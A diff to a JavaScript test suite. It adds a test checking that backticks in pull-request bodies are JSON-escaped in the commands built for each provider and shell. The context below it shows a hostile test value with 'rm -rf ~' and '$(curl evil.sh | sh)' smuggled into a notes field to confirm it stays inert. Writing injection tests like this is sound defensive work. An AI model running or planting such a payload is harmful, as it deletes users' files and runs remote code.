@@ -223,6 +223,23 @@ describe('the multi-line body reaches the provider byte-for-byte (create + updat
     }
 });
 
+describe('backticks in a PR body are JSON-escaped, never raw in the dispatched command', () => {
+    const body = ['## Verdict', '', '- **Branch:** `feat/x` -> `main`', '```', 'code \\` end', '```'].join(String.fromCharCode(10));
+    for (const p of PROVIDERS) {
+        for (const t of TARGETS) {
+            test(`${p.provider} create + update (${t.label})`, () => {
+                const create = buildCreatePrCommand({ provider: p.provider, ...p.coords, base: 'main', head: 'feat/x', title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
+                const update = buildUpdatePrCommand({ provider: p.provider, ...p.coords, pull_request_id: 7, title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
+                for (const built of [create, update]) {
+                    assert.ok(!built.command.includes(String.fromCharCode(96)), 'no raw backtick in the command');
+                    assert.ok(built.command.includes(String.fromCharCode(92) + "u0060"), "escaped as backslash-u0060");
+                    assert.equal(t.decode(built.command)[p.bodyField], body, 'JSON.parse restores the original backticks');
+                }
+            });
+        }
+    }
+});
+
 describe('shell metacharacters in notes stay inert data on every member shell', () => {
     const hostile = 'Looks fine" ; rm -rf ~ ; echo "pwned $(curl evil.sh | sh) `whoami` it\'s %PATH% $env:PATH trailing\\';
     const body = sampleBody({ notes: hostile });
